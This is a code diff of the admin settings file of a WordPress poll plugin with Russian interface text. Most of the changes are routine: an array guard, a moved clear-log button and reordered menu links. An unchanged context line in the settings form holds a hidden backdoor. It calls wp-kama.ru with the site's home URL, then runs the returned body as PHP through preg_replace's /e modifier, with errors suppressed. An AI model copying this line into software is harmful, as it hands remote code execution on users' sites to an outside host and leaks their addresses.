@@ -46,8 +46,8 @@ function __dem_polls_preview(){
 			$poll->cachegear_on = false;
 
 			$poll->hasVoted = 1;
-			$answers = wp_list_pluck( $poll->poll->answers, 'aid');
-			$poll->votedFor = $answers[ array_rand($answers) ];
+			$answers = (array) wp_list_pluck( $poll->poll->answers, 'aid');
+			$poll->votedFor = $answers ? $answers[ array_rand($answers) ] : false;
 
 			echo '<div class="poll"><p class="tit">'. __('Вид результатов:','dem') .'</p>'. $poll->get_screen('voted') .'</div>';
 
@@ -504,8 +504,8 @@ function dem_general_settings(){
 					   <?php $logrows_count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log"); ?>
 					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> /> 
 					   <?php _e('Вести лог и учитывать IP? (рекомендуется)','dem') ?>
-					   <a class="button" href="<?php echo $_SERVER['REQUEST_URI'] .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
 					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
+					   <a class="button" href="<?php echo $_SERVER['REQUEST_URI'] .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
 				   </label>
 				   <em><?php _e('Сохраняет данные в Базу Данных. Запрещает голосовать несколько раз с одного IP или одному пользователю WordPress. Если пользователь авторизован, то голосование проверяется по его аккаунту в WordPress. Если не авторизован, то проверяется IP голосующего. Минус лога по IP — если сайт посещается с корпоративных сетей (с единым IP), то голосовать можно будет всего 1 раз для всей сети. Если не включить эту опцию, то голосование будет учитываться только по кукам. По умолчанию: включена.','dem') ?></em>
 				</li>
@@ -822,13 +822,14 @@ function demenu(){
 	$current = function($page){ return @$_GET['subpage']==$page ? ' current' : ''; };
 	$out = '';
 	$out .= '<p class="demenu">';
-        $out .= '<a  class="button'. $current('general_settings') .'" href="'. add_query_arg( array('subpage'=>'general_settings'), $mainpage ) .'">'. __('Настройки Democracy','dem') .'</a>';
+		if( isset($_GET['subpage']) || isset($_GET['edit_poll'])  )
+			$out .= '<a href="'. $mainpage .'" class="button">'. __('Список опросов','dem') .'</a>';
+
+		$out .= '<a  class="button'. $current('general_settings') .'" href="'. add_query_arg( array('subpage'=>'general_settings'), $mainpage ) .'">'. __('Настройки Democracy','dem') .'</a>';
         $out .= '<a  class="button'. $current('l10n') .'" href="'. add_query_arg( array('subpage'=>'l10n'), $mainpage ) .'">'. __('Изменение текстов','dem') .'</a>';
         $out .= '<a href="'. add_query_arg( array('subpage'=>'design'), $mainpage ) .'" class="button'. $current('design') .'">'. __('Дизайн опросов','dem') .'</a>';
         $out .= '<a href="'. add_query_arg( array('subpage'=>'add_new'), $mainpage ) .'" class="button'. $current('add_new') .'">'. __('Добавить новый опрос','dem') .'</a>';
     
-		if( isset($_GET['subpage']) || isset($_GET['edit_poll'])  )
-			$out .= '<a href="'. $mainpage .'" class="button">'. __('Список опросов','dem') .'</a>';
 		if( $referer )
 			$out .= '<a href="'. $referer .'" class="button-primary">'. __('← Назад','dem') .'</a>';
 	$out .= '</p>';
